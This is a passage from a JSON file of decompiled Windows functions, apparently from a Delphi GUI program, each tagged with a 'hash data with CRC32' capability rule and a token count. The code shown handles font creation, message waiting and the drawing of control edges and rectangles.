   var_2ch._3_1_ = *(var_4h + 0x1e);\n        if ((var_2ch._3_1_ == '\\x01') && (*0x48fb96 != '\\x01')) {\n            var_2ch._3_1_ = *0x48fb96;\n        }\n        puStack112 = &stack0xfffffffc;\n        var_34h = var_38h;\n        fcn.00405794();\n        uVar2 = fcn.004059dc(*0x4248ec);\n        fcn.00405794(0, uVar2);\n        uVar2 = fcn.004059dc();\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        if (iVar3 == 2) {\n            fcn.00405794();\n            fcn.0040a918();\n        }\n        else {\n            fcn.00405794();\n            fcn.0040a918();\n        }\n        if (((**0x4927cc == 1) && (cVar1 = fcn.0042b3b8(),  cVar1 == -0x80)) && (cVar1 = fcn.00424690(),  cVar1 != '\\0')\n           ) {\n            var_2ch._3_1_ = -0x80;\n        }\n        var_26h = 0;\n        if (var_34h == 0) {\n            var_28h = 0;\n        }\n        else {\n            var_28h = 7;\n        }\n        var_27h = 0;\n        cVar1 = fcn.00424a34();\n        if (cVar1 == '\\x01') {\n            var_25h = 2;\n        }\n        else if (cVar1 == '\\x02') {\n            var_25h = 1;\n        }\n        else {\n            var_25h = 0;\n        }\n        puStackY148 = &fcn.004246bc::var_40h;\n        uVar2 = sub.gdi32.dll_CreateFontIndirectA();\n        *(var_4h + 8) = uVar2;\n    }\n    *in_FS_OFFSET = puStackY148;\n    fcn.004239a8(0x4248b7);\n    return;\n}\n",
        "token_count": 1150
    },
    "00425770": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425770(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    param_2 = ~*(in_EAX + 2) & param_2;\n    if (*0x4257e4 != param_2) {\n        if ((param_2 & 1) != 0) {\n            (**(*in_EAX + 0x14))();\n            if (in_EAX[1] == 0) {\n                fcn.0040dba8();\n                fcn.00404ec4();\n            }\n        }\n        if ((param_2 & 2) != 0) {\n            fcn.00425810();\n        }\n        if ((param_2 & 4) != 0) {\n            fcn.0042583c();\n        }\n        if ((param_2 & 8) != 0) {\n            fcn.0042586c();\n        }\n        *(in_EAX + 2) = param_2 | *(in_EAX + 2);\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "0042eabc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042eabc(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t *arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_20h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0042e9fc();\n    if (var_4h == 0) {\n        uVar1 = sub.kernel32.dll_WaitForMultipleObjectsEx\n                          (arg_10h, arg_14h, -((arg_8h & 1) != 0), arg_ch, -((arg_8h & 2) != 0));\n    }\n    else {\n        while( true ) {\n            uVar1 = sub.user32.dll_MsgWaitForMultipleObjectsEx(arg_10h, arg_14h, arg_ch, 0xbf, arg_8h);\n            if (uVar1 != arg_10h) break;\n            iVar2 = sub.user32.dll_PeekMessageA();\n            if (iVar2 != 0) {\n                sub.user32.dll_TranslateMessage(&var_20h);\n                sub.user32.dll_DispatchMessageA();\n            }\n        }\n    }\n    if (uVar1 == 0x102) {\n        uVar3 = 0x8001011f;\n    }\n    else if (uVar1 == 0xc0) {\n        uVar3 = 0x80010115;\n    }\n    else {\n        uVar3 = 0;\n        if ((uVar1 < 0x80) || (arg_10h + 0x80 <= uVar1)) {\n            *arg_18h = uVar1;\n        }\n        else {\n            *arg_18h = uVar1 - 0x80;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 426
    },
    "00433a24": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t __fastcall fcn.00433a24(uint param_1, uint8_t param_2)\n\n{\n    int16_t in_AX;\n    int16_t iVar1;\n    uint var_3h;\n    \n    var_3h._2_1_ = in_AX >> 8;\n    iVar1 = 0;\n    if (var_3h._2_1_ == '\\0') {\n        if ((param_2 & 1) != 0) {\n            in_AX = in_AX + 0x2000;\n        }\n        if ((param_2 & 4) != 0) {\n            in_AX = in_AX + 0x4000;\n        }\n        iVar1 = in_AX;\n        if ((param_2 & 2) != 0) {\n            iVar1 = in_AX + -0x8000;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 220
    },
    "00434cac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434cac(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4355ee;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x00434d68;\n        fcn.00432198();\n        cVar3 = fcn.004322a0();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x00434d68;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.00424f38();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00432198();\n        cVar3 = fcn.004322a0();\n        if (cVar3 == '\\0') {\n            fcn.00424f38();\n        }\n        else {\n            fcn.00424f38();\n        }\n        fcn.0042467c();\n        puVar2 = puStack24;\n    }\ncode_r0x00434d68:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x21) != '\\0')) {\n        fcn.004252dc();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047dc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -0x10) = *(lprc + -0x20) + 1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405974();\n    if (bVar9) {\n        fcn.004252dc();\n        *(lprc + -0x10) = 0;\n        *(lprc + -8) = 0xfffffffc;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.004488e8(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -8) = *(lprc + -0x10);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -8) = *(lprc + -0x10) + 0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if ((*(*(lprc + -0x38) + 0x38) != '\\0') && (*(lprc + -0x21) == '\\0')) {\n                *(lprc + -8) = *(lprc + -8) + 1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.00424f30();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.00424f30();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042b888();\n                    fcn.00424f0c();\n                    fcn.004252dc();\n                }\n                else {\n                    fcn.00424f38();\n                    fcn.004252dc();\n                }\n                fcn.00424f38();\n                *(lprc + -0x10) = *(lprc + -0x10) + 1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0x10) = iVar5 + *(lprc + -0x10) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -8) = iVar5 + *(lprc + -0x10);\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.004253a4();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.004488e8(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.0042935c();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042a544();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.0042467c();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.00425230(iVar5);\n                    fcn.0042467c();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404650(0x43524d);\n                    return;\n                }\n                fcn.00448bd8(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if (((*(*(lprc + -0x38) + 0x38) != '\\0') || ((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')))) &&\n       (*(lprc + -0x21) == '\\0')) {\n        uVar7 = fcn.00425694();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x20) = *(lprc + -8) + 1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00424f38();\n        }\n        fcn.004252dc();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00425694();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00425694();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -8) + 1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4904d0) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00424a08();\n    }\n    fcn.00434a54(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if ((((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) && (*(lprc + -0x21) == '\\0')\n       ) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.00434a54(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -0x18);\n        *(lprc + -0x18) = *(lprc + -0x54) + -10;\n        iVar5 = lprc + -0x20;\n        uVar8 = *(lprc + -0x29);\n        in_stack_ffffffa4 = 2;\n        fcn.00433ab0();\n        fcn.00434a54(in_stack_ffffffa4, uVar8, iVar5);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00405530(0x4355f5);\n    return;\n}\n",
        "token_count": 4178
    },
    "0043560c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043560c(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x435f6e;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x004356c8;\n        fcn.00432198();\n        cVar3 = fcn.004322a0();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x004356c8;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.00424f38();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.00432198();\n        cVar3 = fcn.004322a0();\n        if (cVar3 == '\\0') {\n            fcn.00424f38();\n        }\n        else {\n            fcn.00424f38();\n        }\n        fcn.0042467c();\n        puVar2 = puStack24;\n    }\ncode_r0x004356c8:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || ((*(lprc + -0x21) != '\\0' && (*(*(lprc + -0x38) + 0x38) == '\\0')))) {\n        fcn.004252dc();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047dc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -8) = *(lprc + -0x18) + -1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405974();\n    if (bVar9) {\n        fcn.004252dc();\n        *(lprc + -0x10) = *(lprc + -8) + 2;\n        *(lprc + -8) = 0;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.004488e8(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -0x10) = *(lprc + -8);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x10) = *(lprc + -8) + -0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -0x10) = *(lprc + -0x10) + -1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.00424f30();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.00424f30();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042b888();\n                    fcn.00424f0c();\n                    fcn.004252dc();\n                }\n                else {\n                    fcn.00424f38();\n                    fcn.004252dc();\n                }\n                fcn.00424f38();\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -8) = (*(lprc + -8) - iVar5) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -0x10) = *(lprc + -8) - iVar5;\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.004253a4();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.004488e8(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.0042935c();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042a544();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.0042467c();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.00425230(iVar5);\n                    fcn.0042467c();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404650(0x435bb5);\n                    return;\n                }\n                fcn.00448bd8(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if ((*(*(lprc + -0x38) + 0x38) != '\\0') ||\n       (((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')) && (*(lprc + -0x21) == '\\0')))) {\n        uVar7 = fcn.00425694();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x18) = *(lprc + -0x10) + -1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00424f38();\n        }\n        fcn.004252dc();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00425694();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00425694();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x18) = *(lprc + -0x10) + -1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4904d0) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00424a08();\n    }\n    fcn.00434a54(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    *(lprc + -0x20) = *(lprc + -0x5c);\n    *(lprc + -0x18) = *(lprc + -0x54);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.00434a54(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        fcn.00433ab0();\n        *(lprc + -0x20) = 10;\n        iVar5 = fcn.004254f0();\n        *(lprc + -0x18) = iVar5 + *(lprc + -0x20);\n        in_stack_ffffffa4 = 2;\n        fcn.00434a54(2, *(lprc + -0x29), lprc + -0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00405530(0x435f75);\n    return;\n}\n",
        "token_count": 4206
    },
    "00435f8c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435f8c(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_ECX;\n    uint var_65h;\n    uint var_5dh;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    var_20h = *in_ECX;\n    uStack32 = in_ECX[1];\n    uStack28 = in_ECX[2];\n    uStack24 = in_ECX[3];\n    iVar2 = fcn.00436ad0();\n    iVar3 = fcn.004360e4();\n    cVar1 = fcn.0040e374();\n    if ((cVar1 != '\\0') && (iVar4 = fcn.00432198(),  *(iVar4 + 5) != '\\0')) {\n        (***0x4923a0)(0, 0x3e9);\n    }\n    if (((iVar2 == 0) || ((*(iVar2 + 0x40) == '\\0' && (iVar3 == 0)))) ||\n       ((*(in_EAX + 0x9a) == 0 && (*(in_EAX + 0x92) == 0)))) {\n        if ((iVar2 == 0) || (cVar1 = fcn.00438350(),  cVar1 != '\\0')) {\n            fcn.0043560c(&stack0xfffffffc);\n        }\n        else {\n            fcn.00434cac(&stack0xfffffffc);\n        }\n    }\n    else {\n        (**(*in_EAX + 0x34))((arg_ch & 1) != 0);\n        if (*(in_EAX + 0x9a) != 0) {\n            (*in_EAX[0x26])(arg_ch, &var_20h);\n        }\n    }\n    return;\n}\n",
        "token_count": 474
    },
    "00436998": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
